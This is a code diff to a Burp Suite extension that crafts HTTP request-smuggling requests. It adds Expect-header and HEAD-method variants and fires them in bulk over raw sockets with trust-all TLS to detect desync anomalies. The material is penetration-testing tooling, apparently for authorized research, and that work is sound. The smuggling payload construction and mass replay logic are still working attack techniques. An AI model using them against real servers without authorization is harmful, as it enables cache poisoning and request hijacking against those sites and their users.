@@ -16,7 +16,7 @@ import jarray
 import threading
 from urlparse import urlparse
 
-DEFAULT_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x\r\n"
+DEFAULT_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x"
 STATUS_PENDING = "Pending"
 STATUS_RUNNING = "Running"
 STATUS_COMPLETED = "Completed"
@@ -24,6 +24,8 @@ STATUS_ERROR = "Error"
 DEFAULT_REPLAY_COUNT = 100
 DEFAULT_CONNECTIONS = 100
 MAX_LOG_LINES = 2000
+MUTATION_EXPECT = "Expect"
+MUTATION_HEAD = "HEAD"
 
 # Shared trust-all SSL context (created once, reused for all sockets)
 _SSL_CTX = None
@@ -299,12 +301,15 @@ class EndpointTableModel(AbstractTableModel):
         self.fireTableRowsUpdated(row, row)
 
 
-def build_smuggle_request(helpers, raw_request, http_service, body_str):
+def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation):
     body_len = len(body_str.encode("ascii"))
     analyzed = helpers.analyzeRequest(http_service, raw_request)
     headers = list(analyzed.getHeaders())
     parts = headers[0].split(" ")
-    parts[0] = "POST"
+    if mutation == MUTATION_HEAD:
+        parts[0] = "HEAD"
+    else:
+        parts[0] = "POST"
     headers[0] = " ".join(parts)
     new_headers = [headers[0]]
     has_expect = False
@@ -312,14 +317,16 @@ def build_smuggle_request(helpers, raw_request, http_service, body_str):
     for h in headers[1:]:
         lower = h.lower()
         if lower.startswith("expect:"):
-            new_headers.append("Expect: 100-Continue")
-            has_expect = True
+            if mutation == MUTATION_EXPECT:
+                new_headers.append("Expect: 100-Continue")
+                has_expect = True
+            # HEAD mutation: drop the Expect header entirely
         elif lower.startswith("content-length:"):
             new_headers.append("Content-Length: %d" % body_len)
             has_cl = True
         else:
             new_headers.append(h)
-    if not has_expect:
+    if mutation == MUTATION_EXPECT and not has_expect:
         new_headers.append("Expect: 100-Continue")
     if not has_cl:
         new_headers.append("Content-Length: %d" % body_len)
@@ -365,51 +372,79 @@ class ReplayTask(object):
         callbacks = self.extender._callbacks
         body_str = self.extender.get_exploit_body()
         flag_code = self.extender.get_flag_code()
-        try:
-            modified = build_smuggle_request(
-                helpers, entry.raw_request, entry.http_service, body_str)
-        except Exception as ex:
+        mutations = self.extender.get_active_mutations()
+        if not mutations:
             entry.status = STATUS_ERROR
-            entry.error_msg = "Build error: %s" % str(ex)
+            entry.error_msg = "No mutations selected"
             self._update_ui()
             self._log_result()
             return
         entry.status = STATUS_RUNNING
         self._update_ui()
-        # Baseline via Burp API (proper IHttpRequestResponse)
+        # Run each selected mutation sequentially on this host
+        all_results = {}
+        all_mismatch = {}
+        all_flagged = []
+        for mutation in mutations:
+            m_results, m_mismatch, m_flagged = self._run_mutation(
+                entry, mutation, body_str, flag_code)
+            # Merge results with mutation prefix for clarity
+            for code, cnt in m_results.items():
+                key = "%s:%s" % (mutation, code)
+                all_results[key] = cnt
+            for code, rr in m_mismatch.items():
+                all_mismatch["%s:%s" % (mutation, code)] = rr
+            all_flagged.extend(m_flagged)
+        entry.results = all_results
+        entry.status = STATUS_COMPLETED
+        self._update_ui()
+        self._log_result()
+        if all_mismatch:
+            self._raise_mismatch_issue(entry, all_mismatch)
+        if all_flagged:
+            self._raise_scan_issue(entry, flag_code, all_flagged)
+        self._release_entry(entry)
+
+    def _run_mutation(self, entry, mutation, body_str, flag_code):
+        helpers = self.extender._helpers
+        callbacks = self.extender._callbacks
+        try:
+            modified = build_smuggle_request(
+                helpers, entry.raw_request, entry.http_service, body_str,
+                mutation)
+        except Exception as ex:
+            self.extender._log_on_edt(
+                "[ERROR] %s %s build failed: %s" % (mutation, entry.path, str(ex)))
+            return ({-1: 1}, {}, [])
+        # Baseline via Burp API
         try:
             bl_rr = callbacks.makeHttpRequest(entry.http_service, modified)
             bl_bytes = bl_rr.getResponse()
             bl_code, bl_len = parse_final_status(bl_bytes, helpers)
-            entry.baseline_code = bl_code
-            entry.baseline_length = bl_len
-            entry.baseline_response = bl_rr
         except Exception:
-            entry.baseline_code = -1
-            entry.baseline_length = 0
-            entry.baseline_response = None
+            bl_code = -1
+            bl_len = 0
+            bl_rr = None
+        # Store baseline on entry (last mutation wins for display)
+        entry.baseline_code = bl_code
+        entry.baseline_length = bl_len
+        entry.baseline_response = bl_rr
         self._update_ui()
         self.extender._log_on_edt(
-            "[BASELINE] %s  |  Status: %s  |  Body: %d bytes"
-            % (entry.path, entry.baseline_code, entry.baseline_length))
-        # Remaining via raw sockets -- all connections on one host
+            "[BASELINE %s] %s  |  Status: %s  |  Body: %d bytes"
+            % (mutation, entry.path, bl_code, bl_len))
         remaining = entry.replay_count - 1
-        results = {entry.baseline_code: 1}
+        results = {bl_code: 1}
         mismatch_samples = {}
         flagged_responses = []
-        results_lock = threading.Lock()
         if remaining < 1:
-            entry.results = results
-            entry.status = STATUS_COMPLETED
-            self._update_ui()
-            self._log_result()
-            self._release_entry(entry)
-            return
+            return (results, mismatch_samples, flagged_responses)
         host = str(entry.http_service.getHost())
         port = entry.http_service.getPort()
         use_ssl = str(entry.http_service.getProtocol()).lower() == "https"
-        baseline_code = entry.baseline_code
+        baseline_code = bl_code
         raw_bytes = bytearray(modified)
+        results_lock = threading.Lock()
         latch = CountDownLatch(remaining)
         pool = self.extender._get_pool()
 
@@ -445,14 +480,13 @@ class ReplayTask(object):
         for _ in range(remaining):
             pool.submit(RawSender())
         latch.await()
-        entry.results = results
-        entry.status = STATUS_COMPLETED
-        self._update_ui()
-        self._log_result()
-        if mismatch_samples:
-            self._raise_mismatch_issue(entry, mismatch_samples)
-        if flagged_responses:
-            self._raise_scan_issue(entry, flag_code, flagged_responses)
+        # Log per-mutation summary
+        parts = []
+        for code, cnt in sorted(results.items()):
+            parts.append("%s: %d" % (code if code > 0 else "Err", cnt))
+        self.extender._log_on_edt(
+            "[%s] %s  |  %s" % (mutation, entry.path, ", ".join(parts)))
+        return (results, mismatch_samples, flagged_responses)
         self._release_entry(entry)
 
     def _release_entry(self, entry):
@@ -466,9 +500,9 @@ class ReplayTask(object):
         host = str(entry.http_service.getHost())
         port = entry.http_service.getPort()
         url = URL(protocol, host, port, entry.path)
-        count = entry.results.get(flag_code, 0)
+        count = len(flagged_responses)
         breakdown = ", ".join(
-            "%d: %d" % (c, n) for c, n in sorted(entry.results.items()))
+            "%s: %d" % (k, n) for k, n in sorted(entry.results.items()))
         detail = (
             "<b>Turbo Replay - Anomalous Status Code</b><br><br>"
             "Endpoint: <b>%s</b><br>"
@@ -495,13 +529,10 @@ class ReplayTask(object):
         port = entry.http_service.getPort()
         url = URL(protocol, host, port, entry.path)
         total = sum(entry.results.values())
-        bl_hits = entry.results.get(entry.baseline_code, 0)
-        mm_total = total - bl_hits
+        mm_total = len(mismatch_samples)
         breakdown = ", ".join(
-            "%d: %d" % (c, n) for c, n in sorted(entry.results.items()))
-        mm_codes = ", ".join(
-            "%d (x%d)" % (c, entry.results.get(c, 0))
-            for c in sorted(mismatch_samples.keys()))
+            "%s: %d" % (k, n) for k, n in sorted(entry.results.items()))
+        mm_codes = ", ".join(sorted(mismatch_samples.keys()))
         detail = (
             "<b>Turbo Replay - Baseline Mismatch</b><br><br>"
             "Endpoint: <b>%s</b><br>"
@@ -540,21 +571,14 @@ class ReplayTask(object):
         entry = self.entry
         parts = []
         total = 0
-        for code, cnt in sorted(entry.results.items()):
-            label = str(code) if code > 0 else "Error/NoResp"
-            parts.append("%s: %d" % (label, cnt))
+        for key, cnt in sorted(entry.results.items()):
+            parts.append("%s: %d" % (key, cnt))
             total += cnt
-        summary = "[%s] %s | Total: %d | Baseline: %s | %s" % (
-            entry.status, entry.path, total, entry.baseline_code,
+        summary = "[%s] %s | Total: %d | %s" % (
+            entry.status, entry.path, total,
             ", ".join(parts) if parts else "N/A")
         if entry.error_msg:
             summary += " | " + entry.error_msg
-        if entry.baseline_code is not None:
-            anomalies = [(c, n) for c, n in entry.results.items()
-                         if c != entry.baseline_code]
-            if anomalies:
-                flags = ", ".join("%sx%d" % (c, n) for c, n in anomalies)
-                summary += " ** ANOMALY: " + flags
         self.extender._log_on_edt(summary)
 
 
@@ -600,6 +624,14 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab):
             return int(text)
         except (ValueError, TypeError):
             return None
+
+    def get_active_mutations(self):
+        mutations = []
+        if self._mut_expect_cb.isSelected():
+            mutations.append(MUTATION_EXPECT)
+        if self._mut_head_cb.isSelected():
+            mutations.append(MUTATION_HEAD)
+        return mutations
 
     def processHttpMessage(self, tool_flag, message_is_request, message_info):
         if not message_is_request:
@@ -673,12 +705,21 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab):
         row1.add(JButton("Clear", actionPerformed=self._on_clear))
         top_wrapper.add(row1)
         row2 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
-        self._proxy_cb = JCheckBox("Proxy traffic", True)
+        row2.add(JLabel("Sources:"))
+        self._proxy_cb = JCheckBox("Proxy", True)
         row2.add(self._proxy_cb)
-        self._intruder_cb = JCheckBox("Intruder traffic", True)
+        self._intruder_cb = JCheckBox("Intruder", True)
         row2.add(self._intruder_cb)
-        row2.add(Box.createHorizontalStrut(20))
-        self._autorun_cb = JCheckBox("Auto-run on new endpoints", False)
+        row2.add(Box.createHorizontalStrut(12))
+        row2.add(JLabel("Mutations:"))
+        self._mut_expect_cb = JCheckBox("Expect (POST)", True)
+        self._mut_expect_cb.setToolTipText("POST + Expect: 100-Continue + smuggle body")
+        row2.add(self._mut_expect_cb)
+        self._mut_head_cb = JCheckBox("HEAD", False)
+        self._mut_head_cb.setToolTipText("HEAD method + smuggle body (no Expect header)")
+        row2.add(self._mut_head_cb)
+        row2.add(Box.createHorizontalStrut(12))
+        self._autorun_cb = JCheckBox("Auto-run", False)
         row2.add(self._autorun_cb)
         top_wrapper.add(row2)
         self._main_panel.add(top_wrapper, BorderLayout.NORTH)
